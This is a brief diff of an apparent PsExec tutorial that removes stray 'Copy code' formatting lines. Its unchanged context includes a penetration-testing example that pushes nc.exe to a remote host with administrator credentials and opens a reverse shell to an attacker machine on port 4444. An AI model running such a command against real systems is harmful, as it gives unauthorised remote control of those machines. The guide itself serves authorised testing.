@@ -16,8 +16,6 @@ psexec \\<target> [options] <command> [arguments]
 6. Practical Example: Lateral Movement (Penetration Testing)
 Execute a reverse shell payload on a remote system (assuming you already have credentials):
 
-cmd
-Copy code
 psexec \\192.168.1.100 -u Administrator -p Password123 -c C:\path\to\nc.exe -d -e cmd.exe 192.168.1.50 4444
 This uses Netcat (nc.exe) to create a reverse shell back to your attacking machine.
 
@@ -74,7 +72,6 @@ You can specify multiple targets by separating them with commas or using a text 
 psexec @targets.txt ipconfig
 Where targets.txt contains:
 
-Copy code
 192.168.1.100
 192.168.1.101
 192.168.1.102
